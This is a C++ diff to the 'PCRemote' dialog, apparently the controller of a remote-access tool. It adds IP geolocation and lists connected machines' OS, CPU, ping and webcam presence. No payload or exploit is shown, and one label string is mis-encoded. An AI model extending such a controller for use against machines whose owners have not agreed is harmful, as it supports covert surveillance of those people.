@@ -91,6 +91,12 @@ CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 	iCount = 0;
 	g_pPCRemoteDlg = this;
+
+	if (((CPCRemoteApp*)AfxGetApp())->m_bIsQQwryExist)
+	{
+		m_QQwry = new SEU_QQwry;
+		m_QQwry->SetPath("QQwry.dat");
+	}
 }
 
 void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
@@ -150,7 +156,7 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, 
 			//ProcessReceive(pContext);
 			break;
 		case NC_RECEIVE_COMPLETE:
-			//ProcessReceiveComplete(pContext);
+			ProcessReceiveComplete(pContext);
 			break;
 		}
 	}catch(...){}
@@ -861,6 +867,7 @@ CString CPCRemoteDlg::GetOSDisplayString(OSVERSIONINFOEX& osvi)
 		if(osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
 			strOS = "Windows 2000";
 	}
+	return strOS;
 }
 
 LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam,LPARAM lParam)
@@ -885,6 +892,18 @@ LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam,LPARAM lParam)
 		int nRet = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
 		strIP = (nRet != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";
 		strPCName = pLoginInfo->HostName;
+
+		strOS = GetOSDisplayString(pLoginInfo->OsVerInfoEx);
+		strCPU.Format("%dMHz", pLoginInfo->CPUClockMhz);
+		strPing.Format("%d", pLoginInfo->dwSpeed);
+		strVideo = pLoginInfo->bIsWebCam ? "сп" : "--";
+
+		if (((CPCRemoteApp*)AfxGetApp())->m_bIsQQwryExist)
+		{
+			strAddr = m_QQwry->IPtoAdd(strIP);
+		}
+
+		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing);
 	}
 	catch (...){}
 }
